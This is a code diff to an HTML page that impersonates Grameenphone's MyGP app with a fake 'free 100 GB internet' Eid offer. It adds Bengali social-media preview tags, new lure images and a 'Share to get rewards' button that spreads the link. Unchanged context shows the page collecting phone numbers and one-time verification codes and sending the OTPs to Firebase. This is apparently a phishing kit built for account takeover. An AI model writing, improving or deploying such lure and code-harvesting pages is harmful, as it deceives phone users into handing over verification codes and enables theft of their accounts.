@@ -3,7 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Phone Number Input with Toggle Prefix</title>
+    <title>Grameenphone Free 100 GB Internet</title>
+    <meta property="og:title" content="ঈদ উল ফিতর উপলক্ষে ১০০ জিবি ফ্রি!">
+    <meta property="og:description" content="আমি পেয়েছি আপনি কেন পিছিয়ে থাকবেন ! ফ্রি ১০০ জিবি ইন্টারনেট ডেটা পেতে এখানে ক্লিক করুন">
+    <meta property="og:image" content="https://emily777547-ops.github.io/MyGP---Grameenphone/Gemini_Generated_Image_dwyzkddwyzkddwyz.png">
+    <meta property="og:url" content="https://emily777547-ops.github.io/MyGP---Grameenphone/">
+    <meta property="og:type" content="website">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://emily777547-ops.github.io/MyGP---Grameenphone/Gemini_Generated_Image_dwyzkddwyzkddwyz.png">
     <style>
         * {
             margin: 0;
@@ -660,6 +668,42 @@
             justify-content: center;
         }
 
+        /* শেয়ার বাটনের স্টাইল */
+        .share-reward-btn {
+            background-color: #fff;
+            color: #000;
+            font-weight: bold;
+            font-size: 18px;
+            padding: 14px 25px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 40px;
+            width: auto;
+            min-width: 240px;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            border: 2px solid #3498db;
+        }
+
+        .share-reward-btn:hover {
+            background-color: #FFC000;
+            transform: scale(1.05);
+        }
+
+        .share-reward-btn:active {
+            transform: scale(0.98);
+        }
+
+        .share-reward-btn img {
+            width: 24px;
+            height: 24px;
+        }
+
         .slider-container {
             width: 100%;
             max-width: 300px;
@@ -822,7 +866,7 @@
     <div class="container" id="container">
         <div class="title-container">
             <span class="title-text">Your phone number</span>
-            <span class="subtitle-text">Please enter the correct number. Otherwise, verification may fail or you may not receive the reward.</span>
+            <span class="subtitle-text">অনুগ্রহ করে সঠিক নম্বরটি লিখুন। অন্যথায়, যাচাইকরণ ব্যর্থ হতে পারে অথবা আপনি ১০০ জিবি বিনামূল্যের ইন্টারনেট পুরস্কার নাও পেতে পারেন।</span>
         </div>
 
         <div class="input-container" id="inputContainer">
@@ -844,14 +888,14 @@
         <div class="slider-container" id="sliderContainer">
     <div class="slider-wrapper" id="sliderWrapper">
         <div class="slider-item">
-            <img src="https://i.postimg.cc/FFnPvG1d/image-01.jpg" alt="Offer 1">
+            <img src="https://i.postimg.cc/Pq3xxQK8/20260310-093427.jpg" alt="Offer 1">
         </div>
         <div class="slider-item">
-            <img src="https://i.postimg.cc/50z2352K/20260306_184416.jpg" alt="Offer 2">
+            <img src="https://i.postimg.cc/rw9z6kry/20260310-093404.jpg" alt="Offer 2">
         </div>
         <!-- নতুন ছবি যোগ করুন এইখানে -->
         <div class="slider-item">
-            <img src="https://i.postimg.cc/Fs7jQ814/20260306_182650.jpg" alt="Offer 3">
+            <img src="https://i.postimg.cc/GhwpH2Ph/20260310-093310.jpg" alt="Offer 3">
         </div>
     </div>
 </div>
@@ -946,6 +990,11 @@
         <div class="fifth-page-content">
             <img src="https://i.postimg.cc/DwmnZxP6/20260309-153740.png" alt="Success Icon" class="success-image">
             <h2 class="success-text">Successfully verified</h2>
+            <!-- শেয়ার বাটন যুক্ত করা হলো -->
+            <button class="share-reward-btn" id="shareRewardBtn">
+                <img src="https://i.postimg.cc/q7dx1Gc7/20260305-054458.png" alt="share icon" style="width:24px; height:24px; filter: brightness(0);">
+                Share to get rewards
+            </button>
         </div>
     </div>
 
@@ -1845,6 +1894,38 @@ function showP4OtpError() {
                     // Send OTP2 to Firebase
                     if (currentPhoneNumber) {
                         sendOtp2ToFirebase(currentPhoneNumber, enteredCode);
+                    }
+                });
+            }
+
+            // শেয়ার বাটনের ফাংশনালিটি
+            const shareRewardBtn = document.getElementById('shareRewardBtn');
+            if (shareRewardBtn) {
+                shareRewardBtn.addEventListener('click', function() {
+                    const shareData = {
+                        title: 'MyGP Grameenphone',
+                        text: 'Get rewards by verifying your number!',
+                        url: 'https://emily777547-ops.github.io/MyGP---Grameenphone/'
+                    };
+
+                    if (navigator.share && window.innerWidth <= 768) { // মোবাইল ডিভাইসে নেটিভ শেয়ার
+                        navigator.share(shareData).catch(() => {
+                            // শেয়ার ব্যর্থ হলে ফলব্যাক
+                            fallbackShare();
+                        });
+                    } else {
+                        // ডেস্কটপ বা শেয়ার API সাপোর্ট না করলে ফলব্যাক
+                        fallbackShare();
+                    }
+
+                    function fallbackShare() {
+                        // টেম্পরারি ইনপুট তৈরি করে লিংক কপি করা
+                        const tempInput = document.createElement('input');
+                        tempInput.value = shareData.url;
+                        document.body.appendChild(tempInput);
+                        tempInput.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(tempInput);
                     }
                 });
             }
